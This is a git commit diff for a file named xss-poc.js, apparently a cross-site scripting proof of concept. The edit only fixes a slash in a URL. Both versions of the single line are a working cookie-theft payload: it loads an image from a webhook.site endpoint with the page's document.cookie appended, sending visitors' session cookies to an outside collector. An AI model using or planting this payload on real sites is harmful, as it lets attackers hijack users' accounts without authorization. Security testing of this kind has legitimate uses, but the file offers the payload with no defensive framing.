a4abde9c25db9da423216e029a0e1adbc47fc6d6
kyleseym <65863385+kyleseym@users.noreply.github.com>
2023-06-05 19:33:22 -0500

    Update xss-poc.js

--- xss-poc.js
+++ xss-poc.js
@@ -1,2 +1,2 @@
 
-var i=new Image;i.src="https://webhook.site/a48740e0-0a96-4d17-9561-5302b914f3ec/?cookie="+document.cookie;
+var i=new Image;i.src="https://webhook.site/a48740e0-0a96-4d17-9561-5302b914f3ec?cookie="+document.cookie;
